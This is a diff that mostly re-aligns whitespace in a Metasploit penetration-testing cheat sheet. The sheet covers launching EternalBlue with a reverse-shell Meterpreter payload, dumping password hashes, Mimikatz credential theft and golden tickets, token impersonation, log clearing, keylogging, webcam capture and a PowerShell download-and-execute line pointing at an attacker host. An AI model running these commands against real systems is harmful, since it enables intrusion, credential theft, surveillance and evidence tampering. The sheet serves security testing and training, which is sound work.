@@ -3,10 +3,10 @@ Metasploit
 
 # Startup
 
-service postgresql start                      Start the postgresql db
-msfdb init                                    Create and initialize the msf db
-msfconsole                                    Start Metasploit
-db_status                                     Confirm that Metasploit is connected to the db
+service postgresql start                          Start the postgresql db
+msfdb init                                        Create and initialize the msf db
+msfconsole                                        Start Metasploit
+db_status                                                                                                                                                                                                                                                                                                                                              Confirm that Metasploit is connected to the db
 ------------------------------------------------------------------------------------------------------
 
 # Troubleshooting
@@ -34,23 +34,23 @@ msfconsole
 db_status
 
 - Module database cache not built yet, using slow search
-db_rebuild_cache                              Rebuilds the database-stored module cache
+db_rebuild_cache                                  Rebuilds the database-stored module cache
 ------------------------------------------------------------------------------------------------------
 
 # Help
 
-help or ?                                     Show available commands and their descriptions
-grep -h                                       Show help on the 'grep' command
+help or ?                                         Show available commands and their descriptions
+grep -h                                           Show help on the 'grep' command
 ------------------------------------------------------------------------------------------------------
 
 # Searching
 
 search <string>
-search ms17                                   Show all Microsoft exploits released in 2017
+search ms17                                       Show all Microsoft exploits released in 2017
 
 grep <string> search <type>
-grep php search payloads                      Search payloads then grep for php
-grep linux show post                          Search post exploitation modules then grep for linux
+grep php search payloads                          Search payloads then grep for php
+grep linux show post                              Search post exploitation modules then grep for linux
 grep -v gather search post/windows
 ------------------------------------------------------------------------------------------------------
 
@@ -62,16 +62,16 @@ use <auxiliary, encoder, exploit, nop, payload, post>
 
 use exploit/windows/smb/ms17_010_eternalblue
 show info
-show targets                                  Show OSs that can be targeted with this exploit
+show targets                                      Show OSs that can be targeted with this exploit
 set rhost <target IP>
-show payloads                                 Show payloads that work with this exploit
+show payloads                                     Show payloads that work with this exploit
 set payload windows/x64/meterpreter/reverse_tcp
-show options                                  Show remaining options for the payload
-set lhost <attacker IP>                       Set to the attacker's IP
-set lport <attacker port>                     Set the listening port to 443
+show options                                      Show remaining options for the payload
+set lhost <attacker IP>                           Set to the attacker's IP
+set lport <attacker port>                         Set the listening port to 443
 show advanced
 show evasion
-exploit                                       Run the exploit
+exploit                                           Run the exploit
 ------------------------------------------------------------------------------------------------------
 
 # Payloads
@@ -99,36 +99,36 @@ set PAYLOAD php/meterpreter/reverse_tcp
 
 # Database
 
-workspace                                     Show workspaces (* shows the active workspace)
+workspace                                         Show workspaces (* shows the active workspace)
 * default
   client1
   client2
 
-workspace client1                             Switch workspace
+workspace client1                                 Switch workspace
 
-workspace                                     List workspaces
+workspace                                         List workspaces
   default
-* client1                                     * shows the active workspace
+* client1                                         * shows the active workspace
   client2
 
-workspace -a <name>                           Add workspace(s)
-workspace -d <name>                           Delete workspace(s)
-workspace -r <old> <new>                      Rename workspace
+workspace -a <name>                               Add workspace(s)
+workspace -d <name>                               Delete workspace(s)
+workspace -r <old> <new>                          Rename workspace
 
 db_import <path to file>
-hosts                                         Confirm hosts have been imported
+hosts                                             Confirm hosts have been imported
 
-db_export -f xml /root/msf.xml                Backup db in xml format
+db_export -f xml /root/msf.xml                    Backup db in xml format
 
-hosts -h                                      Show help on the host command
-services -h                                   Show help on the services command
+hosts -h                                          Show help on the host command
+services -h                                       Show help on the services command
 
-services -c port,protocol,name                Show specific columns
-services -p 22                                Search for a specific port
-services -s http                              Search for a specific service
+services -c port,protocol,name                    Show specific columns
+services -p 22                                    Search for a specific port
+services -s http                                  Search for a specific service
 
 creds
-loot -h                                       Show help on the loot command
+loot -h                                           Show help on the loot command
 ------------------------------------------------------------------------------------------------------
 
 # Meterpreter
@@ -137,42 +137,42 @@ You will need to be at a Meterpreter prompt (meterpreter >) instead of a Metaspl
 to run Meterpreter commands.
 
 help
-background                                    Send the current session to the background, and return to the 'msf' prompt
+background                                        Send the current session to the background, and return to the 'msf' prompt
 
-cat <file>                                    Show the contents of a file
-edit <file>                                   Edit the contents of a file using vim
-execute -f cmd.exe -i -H                      Run a command on the target
+cat <file>                                        Show the contents of a file
+edit <file>                                       Edit the contents of a file using vim
+execute -f cmd.exe -i -H                          Run a command on the target
 
-cd                                            Change directory
-ls                                            List directory
-pwd                                           Print working directory
+cd                                                Change directory
+ls                                                List directory
+pwd                                               Print working directory
 
-lcd                                           Change the local directory
-lpwd                                          Print the local working directory
+lcd                                               Change the local directory
+lpwd                                              Print the local working directory
 
-download c:\\boot.ini                         Download a file from the target (use double back slashes)
-upload evil.exe c:\\windows\\system32         Upload a file to the target (use double back slashes)
+download c:\\boot.ini                             Download a file from the target (use double back slashes)
+upload evil.exe c:\\windows\\system32             Upload a file to the target (use double back slashes)
 
-clearev                                       Clear the Application, System, and Security logs on a Windows target
-getuid                                        Show the user that Meterpreter is running as
-hashdump                                      Dump the SAM database
-idletime                                      Show the number of seconds the user on the target has been idle
-ipconfig                                      Show the network interfaces and addresses on the target
-migrate                                       Migrate to another process
-ps                                            Show running processes
-resource                                      Execute Meterpreter instructions in a file
-search -f <file>                              Locate files on the target
-shell                                         Drop to a standard shell on the target
-webcam_list                                   Show currently available web cams
-webcam_snap                                   Takes a picture from the web cam
+clearev                                           Clear the Application, System, and Security logs on a Windows target
+getuid                                            Show the user that Meterpreter is running as
+hashdump                                          Dump the SAM database
+idletime                                          Show the number of seconds the user on the target has been idle
+ipconfig                                          Show the network interfaces and addresses on the target
+migrate                                           Migrate to another process
+ps                                                Show running processes
+resource                                          Execute Meterpreter instructions in a file
+search -f <file>                                  Locate files on the target
+shell                                             Drop to a standard shell on the target
+webcam_list                                       Show currently available web cams
+webcam_snap                                       Takes a picture from the web cam
 ------------------------------------------------------------------------------------------------------
 
 # Sessions
 
-sessions -h                                   Show help on the sessions command
-sessions -l                                   Show active sessions
-sessions -i 2                                 Interact with session 2
-ctrl z                                        Background the current session
+sessions -h                                       Show help on the sessions command
+sessions -l                                       Show active sessions
+sessions -i 2                                     Interact with session 2
+ctrl z                                            Background the current session
 
 Many options allow specifying session ranges using commas and dashes. For example:
      sessions -s checkvm -i 1,3-6
@@ -181,19 +181,19 @@ Many options allow specifying session ranges using commas and dashes. For exampl
 
 # Post exploitation
 
-sysinfo                                       Gets information about the remote system, such as OS
-getuid                                        Get the user that the server is running as
-ps                                            Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
-migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM (or root on *nix)
+sysinfo                                           Gets information about the remote system, such as OS
+getuid                                            Get the user that the server is running as
+ps                                                Search for a process running as NT AUTHORITY\SYSTEM (or root on *nix)
+migrate <PID>                                     Migrate to a process running as NT AUTHORITY\SYSTEM (or root on *nix)
 ------------------------------------------------------------------------------------------------------
 
 # Privilege escalation - Windows
 
 - Option 1
-use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM
-getsystem                                     Will use a number of different techniques to attempt to gain SYSTEM 
-                                                 level privileges on the remote system
-background                                    If this fails, background the current session and try other options
+use priv                                          Attempt to elevate to NT AUTHORITY\SYSTEM
+getsystem                                         Will use a number of different techniques to attempt to gain SYSTEM 
+                                                       level privileges on the remote system
+background                                        If this fails, background the current session and try other options
 
 - Option 2
 use post/multi/recon/local_exploit_suggester
@@ -207,14 +207,14 @@ run
 
 getuid
 getsystem
-getuid                                        Privileges should now be NT AUTHORITY\SYSTEM
+getuid                                            Privileges should now be NT AUTHORITY\SYSTEM
 
 - Option 4
 use post/windows/escalate/droplnk
 set SESSION 1
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
-set LPORT 444                                 This MUST be a different port from what was used in the original exploit
+set LPORT 444                                     This MUST be a different port from what was used in the original exploit
 exploit
 
 - Option 5
@@ -226,15 +226,15 @@ set LPORT 444
 exploit
 
 - Option 6
-use exploit/windows/local/                    There are currently 77 options - 12/29/19
+use exploit/windows/local/                        There are currently 77 options - 12/29/19
 ------------------------------------------------------------------------------------------------------
 
 # Dump hashes
 
-hashdump                                      Try to dump password hashes, if this fails continue
-ps                                            Show running processes
-migrate <PID>                                 Migrate to a process running as NT AUTHORITY\SYSTEM
-hashdump                                      Dump password hashes
+hashdump                                          Try to dump password hashes, if this fails continue
+ps                                                Show running processes
+migrate <PID>                                     Migrate to a process running as NT AUTHORITY\SYSTEM
+hashdump                                          Dump password hashes
 
 run post/windows/gather/credentials/credential_collector
 run post/windows/gather/credentials/domain_hashdump
@@ -243,37 +243,37 @@ run post/windows/gather/credentials/gpp
 
 # Mimikatz
 
-load kiwi                                     Load Mimikatz
-creds_all                                     Retrieve all credentials
-creds_kerberos                                Retrieve Kerberos creds
-creds_livessp                                 Retrieve LiveSSP creds
-creds_msv                                     Retrieve LM/NTLM creds (hashes)
-creds_ssp                                     Retrieve SSP creds
-creds_tspkg                                   Retrieve TsPkg creds
-creds_wdigest                                 Retrieve WDigest creds
-golden_ticket_create                          Create a golden kerberos ticket
-kerberos_ticket_list                          List all kerberos tickets
-kerberos_ticket_purge                         Purge any in-use kerberos tickets
-kerberos_ticket_use                           Use a kerberos ticket
-lsa_dump                                      Dump LSA secrets
-wifi_list                                     List wifi profiles/creds
+load kiwi                                         Load Mimikatz
+creds_all                                         Retrieve all credentials
+creds_kerberos                                    Retrieve Kerberos creds
+creds_livessp                                     Retrieve LiveSSP creds
+creds_msv                                         Retrieve LM/NTLM creds (hashes)
+creds_ssp                                         Retrieve SSP creds
+creds_tspkg                                       Retrieve TsPkg creds
+creds_wdigest                                     Retrieve WDigest creds
+golden_ticket_create                              Create a golden kerberos ticket
+kerberos_ticket_list                              List all kerberos tickets
+kerberos_ticket_purge                             Purge any in-use kerberos tickets
+kerberos_ticket_use                               Use a kerberos ticket
+lsa_dump                                          Dump LSA secrets
+wifi_list                                         List wifi profiles/creds
 ------------------------------------------------------------------------------------------------------
 
 # Steal tokens
 
 getuid
 use incognito
-list_tokens -u                                List of tokens that are available
-impersonate_token <domain>\\<user>            Impersonate a domain account
-impersonate_token "NT AUTHORITY\SYSTEM"       Impersonate a local account
+list_tokens -u                                    List of tokens that are available
+impersonate_token <domain>\\<user>                Impersonate a domain account
+impersonate_token "NT AUTHORITY\SYSTEM"           Impersonate a local account
 getuid
-rev2self                                      Revert back to the original token
+rev2self                                          Revert back to the original token
 getuid
 
-ps                                            Show running processes
+ps                                                Show running processes
 steal_token <PID>
 getuid
-drop_token                                    Revert back to the orginal token
+drop_token                                        Revert back to the orginal token
 getuid
 ------------------------------------------------------------------------------------------------------
 
@@ -380,7 +380,7 @@ powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://hacke
 
 # Pivoting
 
-run post/multi/manage/autoroute               Add routes to all local subnets
+run post/multi/manage/autoroute                   Add routes to all local subnets
 run arp_scanner -r 10.10.0.1/24
 
 use auxiliary/scanner/portscan/tcp
@@ -397,7 +397,7 @@ use exploit/multi/script/web_delivery
 set lhost <attacker IP>
 set lport <attacker port>
 show targets
-set target 2                                  Set the target language to PowerShell
+set target 2                                      Set the target language to PowerShell
 set payload windows/meterpreter/reverse_tcp
 exploit
 
@@ -405,7 +405,7 @@ exploit
 use exploit/multi/script/web_delivery
 set lhost <attacker IP>
 set lport <attacker port>
-set target 0                                  Set the target language to Python
+set target 0                                      Set the target language to Python
 set payload python/meterpreter/reverse_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
@@ -450,15 +450,15 @@ exploit
 
 # Misc
 
-idletime                                      Returns the number of seconds the remote user has been idle
+idletime                                          Returns the number of seconds the remote user has been idle
      If time < 5 min
-     keyscan_start                            Start capturing keystrokes
-     keyscan_stop                             Stop capturing keystrokes
-     keyscan_dump                             Dump the keystroke buffer
+     keyscan_start                                Start capturing keystrokes
+     keyscan_stop                                 Stop capturing keystrokes
+     keyscan_dump                                 Dump the keystroke buffer
 
-screenshot                                    Grab a screenshot of the interactive desktop
+screenshot                                        Grab a screenshot of the interactive desktop
 
-timestomp                                     Manipulate file MACE attributes
+timestomp                                         Manipulate file MACE attributes
 
 run vnc
      If the screen is locked exit VNC
